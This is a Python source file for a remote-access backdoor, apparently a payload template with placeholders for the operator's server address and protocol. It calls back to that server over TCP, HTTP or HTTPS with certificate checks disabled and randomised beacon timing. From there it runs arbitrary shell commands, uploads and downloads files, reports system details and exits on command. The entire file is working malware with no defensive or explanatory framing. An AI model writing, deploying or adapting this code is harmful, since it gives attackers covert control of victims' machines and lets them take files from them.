import socket
import subprocess
import json
import time
import random
import urllib.request
import urllib.error
import ssl
import base64
import os

PROTOCOL = "{{PROTOCOL}}"
SERVER_IP = "{{SERVER_IP}}"
SERVER_PORT = int("{{SERVER_PORT}}")

def handle_command(cmd_data):
    if not isinstance(cmd_data, dict):
        return {"status": "error", "error": "Invalid command format"}

    cmd_type = cmd_data.get("type")

    if cmd_type == "shell":
        command = cmd_data.get("command", "")
        try:
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
            )
            try:
                output, _ = proc.communicate(timeout=30)
                return {"status": "success", "output": output.decode(errors="ignore")}
            except subprocess.TimeoutExpired:
                # Killing entire process tre
                try:
                    subprocess.run(
                        ["taskkill", "/T", "/F", "/PID", str(proc.pid)],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                except Exception:
                    proc.kill()
                output, _ = proc.communicate()
                partial = output.decode(errors="ignore") if output else ""
                return {"status": "error", "output": partial + "\n[!] Command timed out after 30s and was killed"}
        except Exception as e:
            return {"status": "error", "output": str(e)}

    elif cmd_type == "upload":
        dest = cmd_data.get("dest")
        content = cmd_data.get("content")
        try:
            with open(dest, "wb") as f:
                f.write(base64.b64decode(content))
            return {"status": "success"}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    elif cmd_type == "download":
        file_path = cmd_data.get("file")
        if not os.path.exists(file_path):
            return {"status": "error", "error": "File not found"}
        try:
            with open(file_path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
            return {"status": "success", "content": content}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    elif cmd_type == "sysinfo":
        import platform
        try:
            info = {
                "system": platform.system(),
                "node": platform.node(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor()
            }
            return {"status": "success", "info": info}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    elif cmd_type == "exit":
        os._exit(0)

    elif cmd_type == "noop":
        return None

    return {"status": "error", "error": "Unknown command type"}

def run_tcp():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                buf = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                    while b"\n" in buf:
                        line, buf = buf.split(b"\n", 1)
                        try:
                            cmd_data = json.loads(line.decode(errors="ignore"))
                            result = handle_command(cmd_data)
                            if result is not None:
                                s.sendall((json.dumps(result) + "\n").encode())
                        except json.JSONDecodeError:
                            pass
        except Exception:
            time.sleep(5)

def run_http(use_ssl=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{SERVER_IP}:{SERVER_PORT}/"
    session_id = None

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    while True:
        try:
            req = urllib.request.Request(url)
            if session_id:
                req.add_header("X-Session-ID", session_id)
            
            response = urllib.request.urlopen(req, context=ctx if use_ssl else None)
            if not session_id:
                session_id = response.getheader("X-Session-ID")
            
            data = response.read().decode()
            if data:
                cmd_data = json.loads(data)
                result = handle_command(cmd_data)
                
                if result is not None:
                    post_req = urllib.request.Request(url, data=json.dumps(result).encode(), method="POST")
                    post_req.add_header("X-Session-ID", session_id)
                    post_req.add_header("Content-Type", "application/json")
                    urllib.request.urlopen(post_req, context=ctx if use_ssl else None)
            
            time.sleep(random.uniform(2, 5))
        except Exception:
            time.sleep(random.uniform(5, 15))

def main():
    if PROTOCOL == "tcp":
        run_tcp()
    elif PROTOCOL == "http":
        run_http(use_ssl=False)
    elif PROTOCOL == "https":
        run_http(use_ssl=True)

if __name__ == "__main__":
    main()

